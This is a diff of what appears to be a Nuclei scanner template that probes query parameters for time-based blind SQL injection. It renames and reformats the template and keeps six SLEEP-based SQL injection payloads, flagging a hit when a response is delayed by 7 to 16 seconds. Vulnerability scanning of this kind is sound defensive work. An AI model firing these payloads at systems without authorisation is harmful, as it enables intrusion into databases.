@@ -1,35 +1,32 @@
-id: blind-sqli
+id: time-based-sqli
 
 info:
-  name: Blind SQL Injection
+  name: Time-Based Blind SQL Injection
   author: 0xKayala
-  severity: critical
-  description: |
-    Blind SQL Injection is a type of SQL Injection attack that asks the database true or false questions and determines the answer based on the application's response. This can be used to extract information from the database.
-  tags: sqli,blind,dast
+  severity: Critical
+  description: Detects time-based blind SQL injection vulnerability
 
 http:
   - method: GET
     path:
-      - "{{BaseURL}}"
-      
+        - "{{BaseURL}}" 
     payloads:
       injection:
-        - " (SELECT (0) FROM (SELECT (SLEEP (7)))a)"
-        - "'XOR (SELECT (0) FROM (SELECT (SLEEP (7)))a) XOR'Z"
-        - "' AND (SELECT 4800 FROM (SELECT (SLEEP (7))) HoBG) - - "
-        - "if (now () =sysdate (),SLEEP (7),0)"
-        - "'XOR (if (now ( ) =sysdate () , SLEEP (7) , 0)) XOR'Z"
-        - "'XOR (SELECT CASE WHEN (1234=1234) THEN SLEEP (7) ELSE 0 END) XOR'Z"
-        
+      - "(SELECT(0)FROM(SELECT(SLEEP(7)))a)"
+      - "'XOR(SELECT(0)FROM(SELECT(SLEEP(7)))a)XOR'Z"
+      - "' AND (SELECT 4800 FROM (SELECT(SLEEP(7)))HoBG)--"
+      - "if(now()=sysdate(),SLEEP(7),0)"
+      - "'XOR(if(now()=sysdate(),SLEEP(7),0))XOR'Z"
+      - "'XOR(SELECT CASE WHEN(1234=1234) THEN SLEEP(7) ELSE 0 END)XOR'Z"
+
     fuzzing:
       - part: query
         type: replace
         mode: single
         fuzz:
-          - "{{injection}}"
+            - "{{injection}}"
     stop-at-first-match: true
     matchers:
-      - type: dsl
-        dsl:
-          - "duration>=7 && duration <=16"
+     - type: dsl
+       dsl:
+       - "duration>=7 && duration <=16"
